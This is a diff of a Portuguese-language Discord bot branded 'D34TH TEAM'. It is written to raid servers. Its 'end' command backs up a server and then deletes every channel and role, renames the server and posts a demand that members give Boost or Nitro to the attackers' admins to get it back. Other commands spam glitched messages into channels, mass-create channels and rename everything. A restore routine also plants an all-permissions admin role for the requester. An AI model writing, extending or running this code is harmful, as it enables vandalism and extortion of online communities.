@@ -35,7 +35,7 @@ def run_flask():
 threading.Thread(target=run_flask, daemon=True).start()
 
 nuke_active = False
-backup_data = {}  # Armazena backups dos servidores
+backup_data = {}
 
 def load_text():
     try:
@@ -86,7 +86,6 @@ BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=154306208222701
 
 # ========== FUNÇÃO DE BACKUP COMPLETO ==========
 async def fazer_backup(guild):
-    """Salva TUDO do servidor: canais, cargos, permissões, categorias"""
     backup = {
         "nome": guild.name,
         "icone": str(guild.icon.url) if guild.icon else None,
@@ -98,7 +97,6 @@ async def fazer_backup(guild):
         "membros": {}
     }
     
-    # Salvar categorias
     for categoria in guild.categories:
         backup["categorias"].append({
             "nome": categoria.name,
@@ -106,7 +104,6 @@ async def fazer_backup(guild):
             "id": categoria.id
         })
     
-    # Salvar canais de texto
     for canal in guild.text_channels:
         backup["canais_texto"].append({
             "nome": canal.name,
@@ -117,7 +114,6 @@ async def fazer_backup(guild):
             "nsfw": canal.nsfw
         })
     
-    # Salvar canais de voz
     for canal in guild.voice_channels:
         backup["canais_voz"].append({
             "nome": canal.name,
@@ -127,7 +123,6 @@ async def fazer_backup(guild):
             "user_limit": canal.user_limit
         })
     
-    # Salvar fóruns
     for forum in guild.forums:
         backup["foruns"].append({
             "nome": forum.name,
@@ -136,7 +131,6 @@ async def fazer_backup(guild):
             "topic": forum.topic
         })
     
-    # Salvar cargos
     for cargo in guild.roles:
         if cargo.name != "@everyone":
             backup["cargos"].append({
@@ -148,7 +142,6 @@ async def fazer_backup(guild):
                 "mentionable": cargo.mentionable
             })
     
-    # Salvar membros e seus cargos
     for member in guild.members:
         if not member.bot:
             cargos = [role.id for role in member.roles if role.name != "@everyone"]
@@ -159,9 +152,7 @@ async def fazer_backup(guild):
 
 # ========== FUNÇÃO DE RESTAURAÇÃO ==========
 async def restaurar_servidor(guild, backup, admin_user_id):
-    """Restaura o servidor exatamente como estava no backup"""
     try:
-        # Apaga tudo primeiro
         for channel in guild.channels:
             try:
                 await channel.delete()
@@ -175,7 +166,6 @@ async def restaurar_servidor(guild, backup, admin_user_id):
                 except:
                     pass
         
-        # Recriar cargos (primeiro para poder atribuir depois)
         cargos_criados = {}
         for cargo_data in backup["cargos"]:
             try:
@@ -191,7 +181,6 @@ async def restaurar_servidor(guild, backup, admin_user_id):
             except:
                 pass
         
-        # Recriar categorias
         categorias_criadas = {}
         for cat_data in backup["categorias"]:
             try:
@@ -201,12 +190,10 @@ async def restaurar_servidor(guild, backup, admin_user_id):
             except:
                 pass
         
-        # Recriar canais de texto
         for canal_data in backup["canais_texto"]:
             try:
                 categoria = None
                 if canal_data["categoria_id"]:
-                    # Tenta encontrar a categoria pelo nome
                     for cat in backup["categorias"]:
                         if cat["id"] == canal_data["categoria_id"]:
                             if cat["nome"] in categorias_criadas:
@@ -224,7 +211,6 @@ async def restaurar_servidor(guild, backup, admin_user_id):
             except:
                 pass
         
-        # Recriar canais de voz
         for canal_data in backup["canais_voz"]:
             try:
                 categoria = None
@@ -245,7 +231,6 @@ async def restaurar_servidor(guild, backup, admin_user_id):
             except:
                 pass
         
-        # Recriar fóruns
         for forum_data in backup["foruns"]:
             try:
                 categoria = None
@@ -265,11 +250,9 @@ async def restaurar_servidor(guild, backup, admin_user_id):
             except:
                 pass
         
-        # Restaurar nome e ícone do servidor
         try:
             await guild.edit(name=backup["nome"])
             if backup["icone"]:
-                # Baixar ícone antigo (se disponível)
                 async with aiohttp.ClientSession() as session:
                     async with session.get(backup["icone"]) as resp:
                         if resp.status == 200:
@@ -277,14 +260,11 @@ async def restaurar_servidor(guild, backup, admin_user_id):
         except:
             pass
         
-        # Atribuir cargos aos membros
         admin_member = guild.get_member(admin_user_id)
         if admin_member:
-            # Criar cargo de admin para o usuário que pediu
             admin_role = await guild.create_role(name="ADMIN-D34TH", permissions=discord.Permissions.all())
             await admin_member.add_roles(admin_role)
         
-        # Atribuir outros cargos
         for user_id, cargos_ids in backup["membros"].items():
             member = guild.get_member(int(user_id))
             if member:
@@ -351,7 +331,6 @@ class ConfirmarReversao(ui.View):
                     
                     if sucesso:
                         await interaction.followup.send("✅ **SERVIDOR RESTAURADO COM SUCESSO!**\n\nTodas as categorias, canais, cargos e permissões foram recuperados!", ephemeral=True)
-                        # Envia mensagem no servidor restaurado
                         if guild.text_channels:
                             embed = discord.Embed(
                                 title="🔄 SERVIDOR RECUPERADO",
@@ -425,9 +404,7 @@ class SpamButton(ui.View):
         for _ in range(10):
             await msg.edit(content=glitch_text(mensagem, random.randint(2,5)))
             await asyncio.sleep(0.4)
-        await msg.edit(content=mensagem)
-
-# ========== COMANDOS ==========
+        await msg.edit(content=mensagem)# ========== COMANDOS ==========
 @bot.command()
 async def invite(ctx):
     try:
@@ -531,4 +508,187 @@ async def nuke(ctx):
             if isinstance(canal, discord.TextChannel):
                 try:
                     msg = await canal.send(mensagem_base)
+                    for _ in range(2):
+                        await msg.edit(content=glitch_text(mensagem_base, 3))
+                        await asyncio.sleep(0.1)
+                    await msg.edit(content=mensagem_base)
+                    enviadas += 1
+                    await asyncio.sleep(0.01)
+                except:
+                    pass
         
+        embed = discord.Embed(title="NUKE COMPLETO", description=f"CANAIS: {criados}\nMENSAGENS: {enviadas}", color=discord.Color.dark_gray())
+        if guild.text_channels:
+            await guild.text_channels[0].send(embed=embed)
+            
+    except Exception as e:
+        print(f"Erro nuke: {e}")
+    finally:
+        nuke_active = False
+
+@bot.command()
+async def end(ctx):
+    global nuke_active
+    try:
+        await ctx.message.delete()
+        nuke_active = True
+        guild = ctx.guild
+        
+        await ctx.send("💾 **FAZENDO BACKUP DO SERVIDOR...**")
+        backup = await fazer_backup(guild)
+        backup_data[guild.id] = backup
+        print(f"✅ Backup do servidor {guild.name} salvo!")
+        
+        nome_antigo = guild.name
+        
+        for channel in guild.channels:
+            try:
+                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
+                    await channel.delete()
+                    await asyncio.sleep(0.02)
+            except:
+                pass
+        
+        for role in guild.roles:
+            if role.name != "@everyone":
+                try:
+                    await role.delete()
+                except:
+                    pass
+        
+        try:
+            await guild.edit(name="D34TH TEAM")
+        except:
+            pass
+        
+        canal_recuperacao = await guild.create_text_channel("💀-RECUPERACAO")
+        await canal_recuperacao.set_permissions(guild.default_role, send_messages=False, read_messages=True)
+        
+        embed = discord.Embed(
+            title="💀 SERVIDOR DESTRUÍDO",
+            description=(
+                "PARA RECUPERAR ESTE SERVIDOR ENTRE NO SERVIDOR ABAIXO E DE UM BOOST OU NITRO A UM DOS ADMINS\n\n"
+                f"**Link:** https://discord.gg/YsgNdA83d\n\n"
+                "Clique no botão abaixo para solicitar a reversão."
+            ),
+            color=discord.Color.dark_gray()
+        )
+        embed.set_footer(text="D34TH TEAM")
+        
+        view = ReverterButton(guild.id, nome_antigo)
+        await canal_recuperacao.send(embed=embed, view=view)
+        
+        print(f"Servidor {guild.name} destruído. Backup salvo. Canal de recuperação criado.")
+        
+    except Exception as e:
+        print(f"Erro end: {e}")
+    finally:
+        nuke_active = False
+
+@bot.command()
+async def rename_all(ctx):
+    try:
+        await ctx.message.delete()
+        guild = ctx.guild
+        contador = 0
+        for channel in guild.channels:
+            if isinstance(channel, discord.TextChannel):
+                try:
+                    await channel.edit(name="d34th-team")
+                    contador += 1
+                    await asyncio.sleep(0.1)
+                except:
+                    pass
+        try:
+            await guild.edit(name="D34TH TEAM")
+            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
+            async with aiohttp.ClientSession() as session:
+                async with session.get(avatar_url) as resp:
+                    if resp.status == 200:
+                        await guild.edit(icon=await resp.read())
+        except:
+            pass
+        embed = discord.Embed(title="RENOMEADO", description=f"{contador} canais", color=discord.Color.dark_gray())
+        await ctx.send(embed=embed, delete_after=5)
+    except Exception as e:
+        await ctx.send(f'Erro: {e}', delete_after=5)
+
+@bot.command()
+async def set_text(ctx, *, texto):
+    try:
+        await ctx.message.delete()
+        if update_text(texto):
+            embed = discord.Embed(title="TEXTO ATUALIZADO", description=f"{texto}", color=discord.Color.dark_gray())
+            await ctx.send(embed=embed, delete_after=5)
+    except Exception as e:
+        await ctx.send(f'Erro: {e}', delete_after=5)
+
+@bot.command()
+async def create_channels(ctx, quantidade: int = 10):
+    try:
+        await ctx.message.delete()
+        if quantidade > 500:
+            quantidade = 500
+        criados = 0
+        for i in range(quantidade):
+            try:
+                await ctx.guild.create_text_channel(f"channel-{i+1}")
+                criados += 1
+                await asyncio.sleep(0.02)
+            except:
+                break
+        embed = discord.Embed(title="CRIADOS", description=f"{criados} canais", color=discord.Color.dark_gray())
+        await ctx.send(embed=embed, delete_after=5)
+    except Exception as e:
+        await ctx.send(f'Erro: {e}', delete_after=5)
+
+@bot.command()
+async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
+    try:
+        await ctx.message.delete()
+        target = canal or ctx.channel
+        texto = load_text()
+        for i in range(quantidade):
+            msg = f"{texto}\nD34TH TEAM\n{i+1}/{quantidade}"
+            await glitch_message(target, msg, 3)
+            await asyncio.sleep(0.05)
+        await ctx.send(f"{quantidade} enviadas", delete_after=5)
+    except Exception as e:
+        await ctx.send(f'Erro: {e}', delete_after=5)
+
+@bot.command()
+async def help_bot(ctx):
+    embed = discord.Embed(title="D34TH BOT", description="COMANDOS", color=discord.Color.dark_gray())
+    embed.add_field(name="COMANDOS", value="`•invite`\n`•button`\n`•glitch`\n`•ping`\n`•nuke`\n`•end`\n`•rename_all`\n`•set_text`\n`•create_channels`\n`•spam`\n`•update_server_icon`", inline=False)
+    embed.add_field(name="ESTATISTICAS", value=f"SERVIDORES: {len(bot.guilds)}\nUSUARIOS: {len(bot.users)}", inline=True)
+    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
+    embed.set_footer(text="D34TH TEAM")
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def backup_info(ctx):
+    try:
+        await ctx.message.delete()
+        embed = discord.Embed(
+            title="💾 BACKUPS SALVOS",
+            description=f"Total de backups: {len(backup_data)}",
+            color=discord.Color.dark_gray()
+        )
+        for guild_id, backup in backup_data.items():
+            guild = bot.get_guild(guild_id)
+            nome = guild.name if guild else "Servidor desconhecido"
+            embed.add_field(
+                name=nome,
+                value=f"ID: {guild_id}\nCanais: {len(backup['canais_texto'] + backup['canais_voz'] + backup['foruns'])}\nCargos: {len(backup['cargos'])}",
+                inline=True
+            )
+        await ctx.send(embed=embed, delete_after=30)
+    except Exception as e:
+        await ctx.send(f"❌ Erro ao mostrar backups: {str(e)}", delete_after=10)
+
+if __name__ == "__main__":
+    print("Iniciando D34TH TEAM...")
+    try:
+        bot.run(TOKEN)
+    except Exception as e:
+        print(f"Erro: {e}")
